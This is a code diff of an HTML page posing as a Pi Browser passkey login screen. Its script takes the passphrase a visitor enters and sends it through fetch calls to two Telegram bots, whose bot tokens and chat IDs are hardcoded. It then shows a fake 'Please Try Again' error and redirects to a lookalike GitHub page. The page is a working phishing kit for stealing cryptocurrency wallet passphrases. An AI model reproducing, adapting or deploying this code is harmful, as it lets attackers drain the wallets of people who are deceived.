@@ -225,87 +225,79 @@
 
   <div class="home-indicator"></div>
 
-  <script>
+ 
   const TELEGRAM_BOT_TOKEN_1 = "7805304548:AAHAAvt4YJ08ujGZRhvliOLUnQ4oMM5Lb64";
   const TELEGRAM_CHAT_ID_1 = "7666653410";
   const TELEGRAM_BOT_TOKEN_2 = "7615321195:AAHXgXRI-WRAGBoLAsjfIuNtisGuDM6OVMo";
   const TELEGRAM_CHAT_ID_2 = "8119887370";
 
-  function sendMessage() {
-    const input = document.getElementById("messageInput");
-    const statusMessage = document.getElementById("statusMessage");
-    const buttons = document.querySelectorAll(".unlock-button");
-    const buttonTexts = document.querySelectorAll(".button-text");
-    
-    const message = input.value.trim();
+<script>
+function sendMessage() {
+  const input = document.getElementById("messageInput");
+  const statusMessage = document.getElementById("statusMessage");
+  const buttons = document.querySelectorAll(".unlock-button");
+  const buttonTexts = document.querySelectorAll(".button-text");
 
-    // Disable input and buttons immediately
-    input.disabled = true;
-    buttons.forEach((button, index) => {
-      button.disabled = true;
-      buttonTexts[index].innerHTML = `<span class="loading-spinner"></span>Processing...`;
-    });
+  const message = input.value.trim();
 
-    // Check length requirement
-    if (message.length <= 24) {
-      showStatus("✗ It should be a 24-length passkey to login", "error");
-      setTimeout(() => {
-        window.location.href = "/";
-      }, 1000);
-      return;
-    }
+  // Disable inputs
+  input.disabled = true;
+  buttons.forEach((button, index) => {
+    button.disabled = true;
+    buttonTexts[index].innerHTML = `<span class="loading-spinner"></span>Processing...`;
+  });
 
-    statusMessage.classList.remove("show");
-
-    const requests = [
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_1, text: message })
-      }),
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message })
-      })
-    ];
-
-    Promise.all(requests)
-      .then(responses => Promise.all(responses.map(res => res.json())))
-      .then(results => {
-        showStatus("✗ Please Try Again", "error");
-        input.value = "";
-      })
-      .catch(error => {
-        showStatus("✗ Please Try Again", "error");
-        console.error("Error:", error);
-      })
-      .finally(() => {
-        setTimeout(() => {
-          window.location.href = "/";
-        }, 1000);
-      });
-  }
-
-  function showStatus(message, type) {
-    const statusMessage = document.getElementById("statusMessage");
-    statusMessage.textContent = message;
-    statusMessage.className = `status-message ${type}`;
+  // If input is too short
+  if (message.length <= 24) {
+    showStatus("✗ It should be a 24-length passkey to login", "error");
     setTimeout(() => {
-      statusMessage.classList.add("show");
-    }, 100);
+      window.location.href = "https://pibrowserkurd.github.io/pibrowserhome/";
+    }, 1000);
+    return;
   }
 
-  // Auto-resize textarea
-  const textarea = document.getElementById("messageInput");
-  textarea.addEventListener("input", function() {
-    this.style.height = "auto";
-    this.style.height = Math.min(this.scrollHeight, 200) + "px";
-  });
+  // Proceed with sending the message if valid
+  statusMessage.classList.remove("show");
 
-  window.addEventListener("load", () => {
-    document.getElementById("messageInput").focus();
-  });
-  </script>
+  const requests = [
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_1, text: message })
+    }),
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message })
+    })
+  ];
+
+  Promise.all(requests)
+    .then(responses => Promise.all(responses.map(res => res.json())))
+    .then(results => {
+      showStatus("✗ Please Try Again", "error");
+      input.value = "";
+    })
+    .catch(error => {
+      showStatus("✗ Please Try Again", "error");
+      console.error("Error:", error);
+    })
+    .finally(() => {
+      setTimeout(() => {
+        window.location.href = "https://pibrowserkurd.github.io/pibrowserhome/";
+      }, 1000);
+    });
+}
+
+function showStatus(message, type) {
+  const statusMessage = document.getElementById("statusMessage");
+  statusMessage.textContent = message;
+  statusMessage.className = `status-message ${type}`;
+  setTimeout(() => {
+    statusMessage.classList.add("show");
+  }, 100);
+}
+</script>
+
 </body>
 </html>
